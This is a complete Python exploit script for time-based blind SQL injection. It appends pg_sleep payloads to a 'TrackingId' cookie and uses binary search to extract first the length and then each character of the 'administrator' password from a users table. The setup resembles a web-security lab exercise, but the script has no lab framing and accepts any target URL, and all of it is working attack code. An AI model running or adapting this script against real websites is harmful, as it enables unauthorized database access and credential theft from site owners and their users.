import requests
import urllib3
import urllib
import sys
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if len(sys.argv) < 4:
    print(f"Usage: python3 {sys.argv[0]} <URL> <TrackingId> <SessionId>")
    sys.exit(1)

def infer(payload: str = '') -> bool:
    if payload != '':
        payload = urllib.parse.quote(payload)
    cookies = {"TrackingId": sys.argv[2] + payload, "session": sys.argv[3]}
    
    for attempt in range(3):
        try:
            start = time.time()
            res = requests.get(url=sys.argv[1], cookies=cookies, verify=False, timeout=20)
            duration = time.time() - start
            return duration >= 3
        except (requests.exceptions.RequestException, Exception) as e:
            if attempt < 2:
                time.sleep(1)
                continue
            return False
    return False

def infer_password_length(maximum_number_chars: int = 30) -> int:
    low = 1
    high = maximum_number_chars
    
    while low <= high:
        mid = (low + high) // 2
        print(f"[*] Testing length: {mid}")
        
        if infer(f"' || (SELECT CASE WHEN (username='administrator' AND LENGTH(password)={mid}) THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users)--"):
            print(f"[+] Found length: {mid}")
            return mid
        
        if infer(f"' || (SELECT CASE WHEN (username='administrator' AND LENGTH(password) < {mid}) THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users)--"):
            high = mid - 1
        else:
            low = mid + 1
            
    return -1

def infer_password(length: int) -> str:
    password = ""
    print(f"[*] Extracting password ({length} chars)...")
    
    for pos in range(1, length + 1):
        low = 32
        high = 126
        found = False
        
        while low <= high:
            mid = (low + high) // 2
            
            if infer(f"' || (SELECT CASE WHEN (username='administrator' AND ASCII(SUBSTR(password,{pos},1)) > {mid}) THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users)--"):
                low = mid + 1
            else:
                if infer(f"' || (SELECT CASE WHEN (username='administrator' AND ASCII(SUBSTR(password,{pos},1)) = {mid}) THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users)--"):
                    password += chr(mid)
                    print(f"    [+] Current: {password}")
                    found = True
                    break
                else:
                    high = mid - 1
        
        if not found:
            print(f"[!] Warning: Character at position {pos} not found.")
            
    return password

if __name__ == "__main__":
    password_len = infer_password_length(30)
    
    if password_len != -1:
        final_password = infer_password(password_len)
        print(f"\n[SUCCESS] Administrator password: {final_password}")
    else:
        print("[!] Could not determine password length.")